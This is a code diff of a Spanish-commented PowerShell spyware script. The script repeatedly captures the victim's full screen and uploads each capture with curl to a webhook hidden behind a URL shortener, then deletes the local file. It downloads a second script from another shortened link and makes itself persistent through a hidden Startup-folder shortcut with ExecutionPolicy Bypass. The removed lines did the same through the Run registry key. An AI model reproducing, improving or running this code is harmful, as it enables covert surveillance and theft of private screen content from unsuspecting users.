@@ -1,109 +1,52 @@
 $hookurl = "https://bit.ly/chu_kbras"
 $seconds = 30 # Intervalo entre capturas
+$a = 0 # Contador de imágenes enviadas al webhook
 $maxImages = 1 # Cantidad máxima de imágenes antes de descargar el otro script
 
-# Función para descargar un archivo desde una URL
-function Download-File {
-    param(
-        [string]$Url,
-        [string]$OutputPath
-    )
-    try {
-        Invoke-WebRequest -Uri $Url -OutFile $OutputPath -ErrorAction Stop
-        Write-Host "Archivo descargado correctamente en: $OutputPath"
-    } catch {
-        Write-Host "Error al descargar el archivo desde $Url: $_"
-        exit
-    }
-}
+# Detección de URL acortada
+if ($hookurl.Length -ne 121){Write-Host "Shortened Webhook URL Detected..." ; $hookurl = (irm $hookurl).url}
 
-# Función para verificar si un archivo existe
-function File-Exists {
-    param(
-        [string]$FilePath
-    )
-    return (Test-Path $FilePath -PathType Leaf)
-}
-
-# Función para agregar una entrada al Registro de Windows
-function Add-RegistryEntry {
-    param(
-        [string]$RegistryPath,
-        [string]$EntryName,
-        [string]$EntryValue
-    )
-    try {
-        New-ItemProperty -Path $RegistryPath -Name $EntryName -Value $EntryValue -PropertyType String -Force | Out-Null
-        Write-Host "Entrada agregada al Registro correctamente."
-    } catch {
-        Write-Host "Error al agregar la entrada al Registro: $_"
-        exit
-    }
-}
-
-# Ruta de la carpeta Documentos del usuario
-$documentsFolderPath = [Environment]::GetFolderPath("MyDocuments")
-$scriptPath = Join-Path -Path $documentsFolderPath -ChildPath "sysw.ps1"
-$registryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-$registryName = "MiScript"
-$registryValue = "`"powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File '$scriptPath'`""
-
-# Descargar el script principal en la carpeta Documentos del usuario si no existe
-if (-not (File-Exists $scriptPath)) {
-    Download-File -Url "https://bit.ly/Screen_dc" -OutputPath $scriptPath
-}
-
-# Agregar la entrada al Registro de Windows si no existe
-if (-not (Test-Path "$registryPath\$registryName")) {
-    Add-RegistryEntry -RegistryPath $registryPath -EntryName $registryName -EntryValue $registryValue
-}
-
-Write-Host "El script está configurado correctamente para ejecutarse al iniciar sesión del usuario de manera oculta."
-
-# Bucle principal para capturar y enviar imágenes al webhook
 do {
     $Filett = "$env:temp\SC.png"
-    # Verificar si el archivo ya existe antes de crear uno nuevo
-    if (-not (File-Exists $Filett)) {
-        try {
-            Add-Type -AssemblyName System.Windows.Forms
-            Add-type -AssemblyName System.Drawing
-            $Screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
-            $bitmap = New-Object System.Drawing.Bitmap $Screen.Width, $Screen.Height
-            $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
-            $graphic.CopyFromScreen(0, 0, 0, 0, $bitmap.Size)
-            $bitmap.Save($Filett, [System.Drawing.Imaging.ImageFormat]::png)
-            Write-Host "Captura de pantalla guardada en: $Filett"
-        } catch {
-            Write-Host "Error al capturar la pantalla: $_"
-        }
-    }
+    Add-Type -AssemblyName System.Windows.Forms
+    Add-type -AssemblyName System.Drawing
+    $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
+    $Width = $Screen.Width
+    $Height = $Screen.Height
+    $Left = $Screen.Left
+    $Top = $Screen.Top
+    $bitmap = New-Object System.Drawing.Bitmap $Width, $Height
+    $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
+    $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
+    $bitmap.Save($Filett, [System.Drawing.Imaging.ImageFormat]::png)
     Start-Sleep 1
-
-    # Verificar si la variable $hookurl está definida antes de utilizarla
-    if (-not $hookurl) {
-        Write-Host "La variable hookurl no está definida."
-        exit
-    }
-
-    # Verificar si la variable $Filett está definida antes de utilizarla
-    if (-not $Filett) {
-        Write-Host "La variable Filett no está definida."
-        exit
-    }
-
-    # Enviar la imagen al webhook
-    try {
-        curl.exe -F "file1=@$Filett" $hookurl
-        Write-Host "Imagen enviada al webhook."
-    } catch {
-        Write-Host "Error al enviar la imagen al webhook: $_"
-    }
-
+    curl.exe -F "file1=@$filett" $hookurl
+    Start-Sleep 1
+    Remove-Item -Path $filett
     Start-Sleep $seconds
 
-    # Reiniciar el contador de imágenes si se ha alcanzado la cantidad máxima
+    # Incrementar contador de imágenes enviadas al webhook
+    $a++
+
+    # Verificar si se ha alcanzado la cantidad máxima de imágenes
     if ($a -eq $maxImages) {
+        # Descargar el script principal
+        $syswUrl = "https://bit.ly/Screen_dc"
+        $syswPath = "$env:USERPROFILE\sysw.ps1"
+        Invoke-WebRequest -Uri $syswUrl -OutFile $syswPath -Force
+        
+        # Crear acceso directo en la carpeta de inicio del usuario
+        $shortcutLocation = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\sysw.lnk"
+        $shell = New-Object -ComObject WScript.Shell
+        $shortcut = $shell.CreateShortcut($shortcutLocation)
+        $shortcut.TargetPath = "powershell.exe"
+        $shortcut.Arguments = "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$syswPath`""
+        $shortcut.Save()
+        
+        # Ejecutar el script principal de manera oculta
+        Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$syswPath`"" -WindowStyle Hidden
+        
+        # Reiniciar contador de imágenes
         $a = 0
     }
 } while ($true)
